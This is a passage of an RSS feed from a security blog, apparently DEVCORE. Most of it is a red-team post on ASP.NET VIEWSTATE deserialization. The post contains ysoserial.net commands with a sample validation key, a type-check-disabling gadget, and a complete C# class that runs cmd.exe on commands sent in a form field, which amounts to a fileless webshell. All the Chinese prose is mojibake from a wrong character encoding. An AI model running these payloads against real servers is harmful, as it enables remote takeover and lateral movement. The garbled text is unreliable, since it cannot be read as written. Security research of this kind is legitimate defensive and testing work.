&lt;p&gt;é¡Œå¤–è©±ï¼Œåˆ©ç”¨ SessionState çš„ååºåˆ—åŒ–å–å¾— ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼ä¸»æ©Ÿæ§åˆ¶æ¬Šçš„å ´æ™¯ä¸¦ä¸åƒ…é™æ–¼ SQL Injectionã€‚åœ¨å…§ç¶²æ»²é€æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œç¶“å¸¸æœƒé‡åˆ°çš„æƒ…å¢ƒæ˜¯ï¼Œæˆ‘å€‘é€éå„æ–¹çš„è³‡è¨Šæ´©æ¼ ( ä¾‹å¦‚ï¼šå…§éƒ¨ GitLabã€ä»»æ„è®€æª”ç­‰ ) å–å¾—è¨±å¤š SQL Server çš„å¸³è™Ÿã€å¯†ç¢¼ï¼Œä½†å”¯ç¨å–å¾—ä¸äº†ç›®æ¨™ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼çš„ Windows ä¸»æ©Ÿçš„å¸³è™Ÿå¯†ç¢¼ï¼Œè€Œç‚ºäº†é”æˆç›®æ¨™ ( æ§åˆ¶æŒ‡å®šçš„ç¶²ç«™ä¸»æ©Ÿ )ï¼Œæˆ‘å€‘å°±æ›¾ç¶“ä½¿ç”¨éé€™å€‹æ–¹å¼å–å¾—ç›®æ¨™çš„æ§åˆ¶æ¬Šï¼Œæ‰€ä»¥ä½œç‚ºå…§ç¶²æ©«å‘ç§»å‹•çš„æ‰‹æ®µä¹Ÿæ˜¯ç¨å¾®æœ‰åƒ¹å€¼ä¸”éå¸¸æœ‰è¶£ã€‚è‡³æ–¼é‚„èƒ½æœ‰ä»€éº¼æ¨£çš„èŠ±æ¨£èˆ‡ç©æ³•ï¼Œå°±è¦é å„ä½æŒçºŒåœ°ç™¼æ®æƒ³åƒåŠ›ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/</link>
                <guid>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate</guid>
                <pubDate>Tue, 21 Apr 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç©è½‰ ASP.NET VIEWSTATE ååºåˆ—åŒ–æ”»æ“Šã€å»ºç«‹ç„¡æª”æ¡ˆå¾Œé–€</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« å‘¼æ‡‰æˆ‘åœ¨ç ”è¨æœƒ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; åˆ†äº«çš„ä¸»é¡Œï¼Œå¦‚ä½•ç”¨å°ç¼ºé™·ä¸€æ­¥æ­¥æ“Šç ´ä½¿ç”¨ ASP.NET æ¡†æ¶æ‰€æ’°å¯«çš„å …å›ºçš„ç¶²ç«™æ‡‰ç”¨ç¨‹å¼ï¼Œå…¶ä¸­ä¹‹ä¸€çš„å…§å®¹å°±æ˜¯é—œæ–¼æˆ‘å€‘åœ¨æ­¤ä¹‹å‰éå¾€ç´…éšŠæ¼”ç·´å°ˆæ¡ˆä¸­ï¼ŒæˆåŠŸæ•¸æ¬¡é€é VIEWSTATE çš„ååºåˆ—åŒ–æ”»æ“Šä¸¦è£½é€ é€²å…¥å…§ç¶²çªç ´å£çš„åˆ©ç”¨æ–¹å¼ä»¥åŠå¿ƒå¾—ï¼Œä¹Ÿå°±æ˜¯æ­¤ç¯‡æ–‡ç« çš„ä¸»é¡Œã€‚&lt;/p&gt;

&lt;h2 id=&quot;å…§æ–‡&quot;&gt;å…§æ–‡&lt;/h2&gt;

&lt;p&gt;æœ€è¿‘å¾®è»Ÿç”¢å“ Exchange Server çˆ†å‡ºä¸€å€‹åš´é‡æ¼æ´ CVE-2020-0688ï¼Œå•é¡Œç™¼ç”Ÿçš„åŸå› æ˜¯æ¯å° Exchange Server å®‰è£å®Œå¾Œåœ¨æŸå€‹ Component ä¸­éƒ½ä½¿ç”¨äº†åŒä¸€æŠŠå›ºå®šçš„ Machine Keyï¼Œè€Œç›¸ä¿¡å¤§å®¶éƒ½å·²ç¶“å¾ˆç†Ÿæ‚‰å–å¾— Machine Key ä¹‹å¾Œçš„åˆ©ç”¨å¥—è·¯äº†ï¼Œå¯ä»¥ç«„æ”¹ ASP.NET Form ä¸­çš„ VIEWSTATE åƒæ•¸å€¼ä»¥é€²è¡Œååºåˆ—åŒ–æ”»æ“Šï¼Œå¾è€Œé”æˆ Remote Code Execution æ§åˆ¶æ•´å°ä¸»æ©Ÿä¼ºæœå™¨ã€‚&lt;/p&gt;

&lt;p&gt;æ›´è©³ç´°çš„ CVE-2020-0688 æ¼æ´ç´°ç¯€å¯ä»¥åƒè€ƒ ZDI blogï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°æ–¼ VIEWSTATE exploit åˆ†æåœ¨ç¶²è·¯ä¸Šå·²ç¶“æœ‰ç„¡æ•¸ç¯‡æ–‡ç« é€²è¡Œæ·±å…¥çš„æ¢è¨ï¼Œæ‰€ä»¥åœ¨æ­¤ç¯‡æ–‡ç« ä¸­å°‡ä¸å†é‡è¤‡è´…è¿°ï¼Œè€Œä»Šå¤©ä¸»è¦æƒ³èŠèŠçš„æ˜¯é—œæ–¼ VIEWSTATE exploit åœ¨æ»²é€æ¸¬è©¦ä¸­å¦‚ä½•é€²è¡Œåˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;æœ€åŸºæœ¬ã€å¸¸è¦‹çš„æ–¹å¼æ˜¯ç›´æ¥ä½¿ç”¨å·¥å…· &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; çš„ ViewState Plugin ç”¢ç”Ÿåˆæ³• MAC èˆ‡æ­£ç¢ºçš„åŠ å¯†å…§å®¹ï¼ŒTypeConfuseDelegate gadget ç¶“éä¸€é€£ä¸²åå°„å‘¼å«å¾Œé è¨­æœƒ invoke Process.Start å‘¼å« cmd.exeï¼Œå°±å¯ä»¥è§¸ç™¼åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate
              -c &quot;echo 123 &amp;gt; c:\pwn.txt&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•°å¸¸çš„ VIEWSTATE é€šå¸¸æœƒå°è‡´ aspx é é¢å›æ‡‰ 500 Internal Server Errorï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿç„¡æ³•ç›´æ¥å¾—çŸ¥æŒ‡ä»¤åŸ·è¡Œçš„çµæœï¼Œä½†æ—¢ç„¶æœ‰äº†ä»»æ„åŸ·è¡Œï¼Œè¦ç”¨ PowerShell å›å½ˆ Reverse Shell æˆ–å›å‚³æŒ‡ä»¤çµæœåˆ°å¤–éƒ¨ä¼ºæœå™¨ä¸Šä¸¦ä¸æ˜¯ä»¶é›£äº‹ã€‚&lt;/p&gt;

&lt;p&gt;But ..&lt;/p&gt;

&lt;p&gt;åœ¨æ»²é€æ¸¬è©¦çš„å¯¦æˆ°ä¸­ï¼Œäº‹æƒ…å¾€å¾€æ²’é€™éº¼ç¾å¥½ã€‚ç¾ä»Šä¼æ¥­è³‡å®‰æ„è­˜éƒ½ç›¸å°é«˜ï¼Œç›®æ¨™ä¼ºæœå™¨ç’°å¢ƒå‡ºç¾ä»¥ä¸‹å¹¾ç¨®é™åˆ¶éƒ½å·²æ˜¯å¸¸æ…‹ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å°é–æ‰€æœ‰ä¸»å‹•å°å¤–é€£ç·š&lt;/li&gt;
  &lt;li&gt;ç¦æ­¢æŸ¥è©¢å¤–éƒ¨ DNS&lt;/li&gt;
  &lt;li&gt;ç¶²é ç›®éŒ„ç„¡æ³•å¯«å…¥&lt;/li&gt;
  &lt;li&gt;ç¶²é ç›®éŒ„é›–å¯å¯«ï¼Œä½†å­˜åœ¨ Website Defacement é˜²ç¦¦æ©Ÿåˆ¶ï¼Œæœƒè‡ªå‹•å¾©åŸæª”æ¡ˆ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ‰€ä»¥é€™æ™‚å°±å¯ä»¥å……åˆ†åˆ©ç”¨å¦ä¸€å€‹ ActivitySurrogateSelectorFromFile gadget çš„èƒ½åŠ›ï¼Œé€™å€‹ gadget åˆ©ç”¨å‘¼å« Assembly.Load å‹•æ…‹è¼‰å…¥ .NET çµ„ä»¶é”æˆ Remote Code Executionï¼Œæ›å¥è©±èªªï¼Œå¯ä»¥ä½¿æˆ‘å€‘æ“æœ‰åœ¨èˆ‡ aspx é é¢åŒä¸€å€‹ Runtime ç’°å¢ƒä¸­åŸ·è¡Œä»»æ„ .NET èªè¨€ç¨‹å¼ç¢¼çš„èƒ½åŠ›ï¼Œè€Œ .NET é è¨­éƒ½æœƒå­˜åœ¨ä¸€äº›æŒ‡å‘å…±æœ‰è³‡æºçš„å…¨åŸŸéœæ…‹è®Šæ•¸å¯ä»¥ä½¿ç”¨ï¼Œä¾‹å¦‚ &lt;a href=&quot;https://docs.microsoft.com/zh-tw/dotnet/api/system.web.httpcontext.current?view=netframework-4.8&quot;&gt;System.Web.HttpContext.Current&lt;/a&gt; å°±å¯ä»¥å–å¾—ç•¶ä¸‹ HTTP è«‹æ±‚ä¸Šä¸‹æ–‡çš„ç‰©ä»¶ï¼Œä¹Ÿå°±åƒæ˜¯æˆ‘å€‘èƒ½åˆ©ç”¨å®ƒä¾†åŸ·è¡Œè‡ªå·±æ’°å¯«çš„ aspx ç¶²é çš„æ„Ÿè¦ºï¼Œä¸¦ä¸”éç¨‹å…¨æ˜¯åœ¨è¨˜æ†¶é«”ä¸­å‹•æ…‹è™•ç†ï¼Œæ–¼æ˜¯å°±ç­‰åŒæ–¼å»ºç«‹äº†ç„¡æª”æ¡ˆçš„ WebShell å¾Œé–€ï¼&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘åªéœ€è¦ä¿®æ”¹ -g çš„åƒæ•¸æˆ ActivitySurrogateSelectorFromFileï¼Œè€Œ -c åƒæ•¸æ”¾çš„å°±ä¸å†æ˜¯ç³»çµ±æŒ‡ä»¤è€Œæ˜¯æƒ³åŸ·è¡Œçš„ ExploitClass.cs C# ç¨‹å¼ç¢¼æª”æ¡ˆï¼Œå¾Œé¢ç”¨ ; åˆ†è™Ÿåˆ†éš”åŠ ä¸Šæ‰€ä¾è³´éœ€è¦å¼•å…¥çš„ dllã€‚&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
              -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é—œæ–¼éœ€è¦å¼•å…¥çš„ dll å¯ä»¥åœ¨å®‰è£äº† .NET Framework çš„ Windows ä¸»æ©Ÿä¸Šæ‰¾åˆ°ï¼Œåƒæˆ‘çš„ç’°å¢ƒæ˜¯åœ¨é€™å€‹è·¯å¾‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319&lt;/code&gt; ä¹‹ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼æœ€é—œéµçš„ ExploitClass.cs è©²å¦‚ä½•æ’°å¯«å‘¢ï¼Ÿå°‡ä¾†æœƒè©¦è‘—æäº¤çµ¦ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt;ï¼Œå°±å¯ä»¥åœ¨ç¯„ä¾‹æª”æ¡ˆè£¡æ‰¾åˆ°å®ƒï¼Œæˆ–æ˜¯å¯ä»¥å…ˆç›´æ¥çœ‹é€™è£¡ï¼š&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;E&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ClearError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/c &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardError&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseShellExecute&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StandardOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server.ClearError()&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Response.End()&lt;/code&gt; éƒ½æ˜¯å¿…è¦ä¸”é‡è¦çš„ä¸€æ­¥ï¼Œå› ç‚ºç•°å¸¸çš„ VIEWSTATE å¿…ç„¶æœƒä½¿å¾— aspx é é¢å›æ‡‰ 500 æˆ–å…¶ä»–éé æœŸçš„ Server Errorï¼Œè€Œå‘¼å«ç¬¬ä¸€å€‹å‡½å¼å¯ä»¥å”åŠ©æ¸…é™¤åœ¨ç•¶å‰ Runtime ç’°å¢ƒä¸‹ stack ä¸­æ‰€è¨˜éŒ„çš„éŒ¯èª¤ï¼Œè€Œå‘¼å« End() å¯ä»¥è®“ ASP.NET å°‡ç•¶å‰ä¸Šä¸‹æ–‡æ¨™è¨˜ç‚ºè«‹æ±‚å·²è™•ç†å®Œæˆä¸¦ç›´æ¥å°‡ Response å›æ‡‰çµ¦å®¢æˆ¶ç«¯ï¼Œé¿å…ç¨‹å¼ç¹¼çºŒé€²å…¥å…¶ä»– Error Handler è™•ç†å°è‡´ç„¡æ³•å–å¾—æŒ‡ä»¤åŸ·è¡Œçš„è¼¸å‡ºçµæœã€‚&lt;/p&gt;

&lt;p&gt;åˆ°é€™å€‹æ­¥é©Ÿçš„è©±ï¼Œç†è«–ä¸Šä½ åªè¦é€å‡ºè«‹æ±‚æ™‚å›ºå®šå¸¶ä¸Šé€™å€‹æƒ¡æ„ VIEWSTATEï¼Œå°±å¯ä»¥åƒæ“ä½œä¸€èˆ¬ WebShell ä¸€æ¨£ï¼š
&lt;img src=&quot;/assets/img/blog/20200311/play-with-viewstate-exploit-and-create-fileless-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸éæœ‰æ™‚ä¹Ÿæœƒå‡ºç¾é€™ç¨®æƒ…å¢ƒï¼š
&lt;img src=&quot;/assets/img/blog/20200311/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸è«–æ€éº¼æ”¹ Payload å†é‡é€æ°¸é éƒ½æ˜¯å¾—åˆ° Server Errorï¼Œæ–¼æ˜¯å°±é–‹å§‹æ‡·ç–‘è‡ªå·±çš„äººç”Ÿ Q_Q&lt;/p&gt;

&lt;p&gt;ä½†ä¹Ÿåˆ¥æ€¥è‘—ç°å¿ƒï¼Œå¯èƒ½åªæ˜¯ä½ é‡ä¸Šçš„ç›®æ¨™æœ‰å¾ˆä¹–åœ°å®šæœŸæ›´æ–°äº†ä¼ºæœå™¨è€Œå·²ï¼Œå› ç‚ºå¾®è»Ÿæ›¾ç‚ºäº† ActivitySurrogateSelector é€™å€‹ gadget åŠ ä¸Šäº†ä¸€äº› patchï¼Œå°è‡´ç„¡æ³•ç›´æ¥åˆ©ç”¨ï¼Œå¥½åœ¨æœ‰å…¶ä»–ç ”ç©¶è€…é¦¬ä¸Šæä¾›äº†è§£æ±ºæ–¹æ³•ä½¿å¾—é€™å€‹ gadget èƒ½å†æ¬¡è¢«åˆ©ç”¨ï¼&lt;/p&gt;

&lt;p&gt;è©³ç´°ç´°ç¯€å¯ä»¥é–±è®€é€™ç¯‡æ–‡ç« ï¼š&lt;a href=&quot;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&quot;&gt;Re-Animating ActivitySurrogateSelector&lt;/a&gt; By &lt;a href=&quot;https://silentbreaksecurity.com/author/nick/&quot;&gt;Nick Landers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç¸½è€Œè¨€ä¹‹ï¼Œå¦‚æœé‡åˆ°ä¸Šè¿°æƒ…å½¢ï¼Œå¯ä»¥å…ˆå˜—è©¦ç”¨ä»¥ä¸‹æŒ‡ä»¤ç”¢ç”Ÿ VIEWSTATE ä¸¦ç™¼é€ä¸€æ¬¡çµ¦ä¼ºæœå™¨ï¼Œé †åˆ©çš„è©±å°±èƒ½ä½¿ç›®æ¨™ Runtime ç’°å¢ƒä¸‹çš„ DisableActivitySurrogateSelectorTypeCheck è®Šæ•¸å€¼è¢«è¨­ç‚º trueï¼Œéš¨å¾Œå†ç™¼é€çš„ ActivitySurrogateSelector gadget å°±ä¸æœƒå†å™´å‡º 500 Server Error äº†ã€‚&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
              -c &quot;ignore&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœä¸Šè¿°ä¸€åˆ‡éƒ½å¾ˆé †åˆ©ã€æˆåŠŸåŸ·è¡Œç³»çµ±æŒ‡ä»¤ä¸¦å›å‚³äº†çµæœï¼ŒåŸºæœ¬ä¸Šå°±è¶³å¤ åšå¤§éƒ¨åˆ†äº‹æƒ…ï¼Œè€Œå‰©ä¸‹çš„å°±æ˜¯ç¹¼çºŒç›¡æƒ…ç™¼æ®ä½ çš„æƒ³åƒåŠ›å§ï¼&lt;/p&gt;

